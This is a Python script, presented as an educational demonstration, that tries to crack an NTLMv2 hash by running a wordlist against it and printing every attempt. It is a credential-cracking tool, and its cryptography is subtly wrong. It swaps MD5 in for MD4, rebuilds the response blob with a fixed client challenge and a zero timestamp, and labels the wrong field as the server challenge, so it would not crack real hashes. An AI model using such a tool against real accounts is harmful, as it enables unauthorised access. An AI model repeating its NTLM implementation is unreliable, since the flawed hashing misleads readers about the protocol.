#!/usr/bin/env python3
"""
NTLMv2 Hash Cracker - Educational Demonstration
This script demonstrates how to crack NTLMv2 hashes
"""

import hashlib
import hmac
import struct
import binascii

def ntlm_hash(password):
    """Generate NTLM hash (MD4 of password in UTF-16LE)"""
    try:
        # For demonstration, we'll use MD5 instead of MD4 (not available in newer Python)
        password_utf16 = password.encode('utf-16le')
        return hashlib.md5(password_utf16).digest()  # Using MD5 for demo
    except:
        return None

def generate_ntlmv2_hash(username, domain, password, server_challenge):
    """Generate NTLMv2 hash for verification"""
    # Generate NTLM hash
    ntlm_hash_bytes = ntlm_hash(password)
    if not ntlm_hash_bytes:
        return None
    
    # Generate NTLMv2 hash
    user_domain = (username.upper() + domain.upper()).encode('utf-16le')
    ntlmv2_hash = hmac.new(ntlm_hash_bytes, user_domain, hashlib.md5).digest()
    
    # Generate client challenge and timestamp (simplified)
    client_challenge = b'\x11\x22\x33\x44\x55\x66\x77\x88'
    timestamp = b'\x00\x00\x00\x00\x00\x00\x00\x00'
    
    # Generate blob
    blob = b'\x01\x01\x00\x00'  # Blob signature
    blob += b'\x00\x00\x00\x00'  # Reserved
    blob += timestamp  # Timestamp
    blob += client_challenge  # Client challenge
    blob += b'\x00\x00\x00\x00'  # Reserved
    
    # Generate NTLMv2 response
    challenge_blob = server_challenge + blob
    ntlmv2_response = hmac.new(ntlmv2_hash, challenge_blob, hashlib.md5).digest()
    
    # Generate NTProofStr
    ntproofstr = ntlmv2_response[:16]
    
    # Full NTLMv2 response
    full_response = ntproofstr + blob
    
    return ntproofstr.hex(), full_response.hex()

def crack_ntlmv2_hash(hash_line, wordlist):
    """Attempt to crack NTLMv2 hash using wordlist"""
    print(f"Attempting to crack: {hash_line}")
    
    # Parse hash components - split by :: first, then by :
    if '::' not in hash_line:
        print("Invalid hash format - missing ::")
        return None
    
    # Split by :: to separate username from the rest
    username_part, rest = hash_line.split('::', 1)
    username = username_part
    
    # Split the rest by : to get domain, challenge, ntproofstr, response
    parts = rest.split(':')
    if len(parts) != 4:
        print("Invalid hash format - wrong number of parts")
        return None
    
    domain = parts[0]
    server_challenge = binascii.unhexlify(parts[1])
    target_ntproofstr = parts[2]
    target_response = parts[3]
    
    print(f"Username: {username}")
    print(f"Domain: {domain}")
    print(f"Server Challenge: {parts[2]}")
    print(f"Target NTProofStr: {target_ntproofstr}")
    print(f"Target Response: {target_response}")
    print()
    
    # Try each password from wordlist
    for password in wordlist:
        password = password.strip()
        if not password:
            continue
            
        print(f"Trying password: {password}")
        
        # Generate hash for this password
        ntproofstr, response = generate_ntlmv2_hash(username, domain, password, server_challenge)
        
        if ntproofstr and response:
            print(f"  Generated NTProofStr: {ntproofstr}")
            print(f"  Generated Response: {response}")
            
            # Check if it matches
            if ntproofstr.lower() == target_ntproofstr.lower():
                print(f"  *** MATCH FOUND! Password is: {password} ***")
                return password
            else:
                print(f"  No match")
        else:
            print(f"  Failed to generate hash")
        
        print()
    
    print("Password not found in wordlist")
    return None

def main():
    print("NTLMv2 Hash Cracker - Educational Demonstration")
    print("=" * 50)
    
    # Read the hash file
    try:
        with open('ntlm_hash.txt', 'r') as f:
            hash_line = f.read().strip()
    except FileNotFoundError:
        print("ntlm_hash.txt not found")
        return
    
    # Read the wordlist
    try:
        with open('wordlist.txt', 'r') as f:
            wordlist = f.readlines()
    except FileNotFoundError:
        print("wordlist.txt not found")
        return
    
    # Attempt to crack the hash
    result = crack_ntlmv2_hash(hash_line, wordlist)
    
    if result:
        print(f"\nSUCCESS: Password found - {result}")
    else:
        print("\nFAILED: Password not found in wordlist")

if __name__ == "__main__":
    main()